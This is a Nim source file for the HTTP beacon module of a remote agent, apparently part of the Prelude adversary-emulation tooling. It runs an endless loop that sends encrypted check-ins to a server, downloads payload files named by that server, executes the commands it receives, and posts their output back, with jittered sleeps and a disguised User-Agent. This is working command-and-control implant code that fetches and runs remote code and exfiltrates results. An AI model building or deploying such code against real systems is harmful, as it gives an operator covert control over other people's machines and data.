import uri
import logging
import strformat
import strutils
import httpclient
import marshal
from contact import Beacon, HTTPPayload, parseUriBase, jitterSleep
from ../commands/commands import CommandExecution, runCommand
from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
from ../util/config import encryptionKey
from ../util/encoder import hexToSeqByte, seqByteToHex

var logger = newConsoleLogger()


proc checkValidHTTPTarget*(address: string): bool =
    ## Checks if a string is valid HTTP address.
    ##
    let host = parseUri(address)
    if host.scheme == "" or host.hostname == "":
        logger.log(lvlFatal, fmt"{address} is an invalid URL for HTTP/S beacons.")
    else:
        result = true

proc requestHTTPPayload(address: string): HTTPPayload =
    ## Returns an HTTP request.
    ## 
    if checkValidHTTPTarget(address):
        var client = newHttpClient()
        let response: Response = client.get(address)
        result = HTTPPayload(body: response.body, filename: parseUriBase(address), error: 0)
    else:
        result = HTTPPayload(error: 1)

proc requestPayload*(address: string) =
    ## Writes an HTTP request body to the local directory.
    ## 
    let payload: HTTPPayload = requestHTTPPayload(address)
    let path: string = "./" & payload.filename
    writeFile(path, payload.body)

proc syncPost(address: string, beacon: Beacon): string =
    ## Synchronous POST request.
    ## 
    var client = newHttpClient()
    let data: string = seqByteToHex(encrypt($$beacon, encryptionKey))
    client.headers = newHttpHeaders({ "User-Agent": "ayylmao/1.1", "Accept-Encoding": "gzip" })
    result = client.postContent(url = address, body = data)

proc beaconPost(address: string, beacon: Beacon): string =
    ## POSTs the agent beacon to address.
    ## 
    var body = syncPost(address, beacon)
    body = body.strip()
    if len(body) > 0:
        result = toString(decrypt(hexToSeqByte(body), encryptionKey))

proc httpCommunicate*(address: string, sleep: int, beacon: Beacon) =
    ## Listens for Prelude HTTP beacons.
    ## 
    if checkValidHTTPTarget(address):
        var newBeacon: Beacon = beacon
        while true:
            var body: string = beaconPost(address = address, beacon = beacon)
            if len(body) == 0:
                jitterSleep(sleep, "HTTP")
                continue

            var unmarshalledBeacon: Beacon = to[Beacon](body)
            if len(unmarshalledBeacon.Links) == 0:
                # Sleep until the next beacon.
                jitterSleep(sleep, "HTTP")
                continue

            for link in unmarshalledBeacon.Links:
                if len(link.Payload) > 0:
                    requestPayload(link.Payload)
                var response: CommandExecution = runCommand(executor = link.Executor, message = link.Request)
                var newLink = link
                newLink.Response = response.bites
                newLink.Status = response.status
                newLink.Pid = response.pid
                newBeacon.Links.add(newLink)
            
            body = beaconPost(address = address, beacon = newBeacon)
            jitterSleep(sleep, "HTTP")
